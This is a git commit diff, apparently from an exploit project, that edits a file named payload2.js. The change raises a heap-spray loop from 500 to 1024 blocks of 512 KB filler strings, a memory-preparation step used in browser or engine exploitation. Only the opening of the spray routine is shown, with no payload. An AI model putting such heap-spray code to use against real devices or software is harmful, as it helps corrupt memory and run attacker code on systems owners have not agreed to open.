b807127c42167945e8e844fdabc517e49dd07c2c
davilone32 <126024362+davilone32rl@users.noreply.github.com>
2024-11-04 19:11:57 +0100

    v

--- WBN/payload2.js
+++ WBN/payload2.js
@@ -1,7 +1,7 @@
 (function() {
     const sprayArray = [];
     const spraySize = 0x80000;  // 512 KB por bloque
-    const sprayCount = 500;     // Número de bloques para evitar saturación total
+    const sprayCount = 1024;     // Número de bloques para evitar saturación total
 
     for (let i = 0; i < sprayCount; i++) {
         let sprayStr = "A".repeat(spraySize);
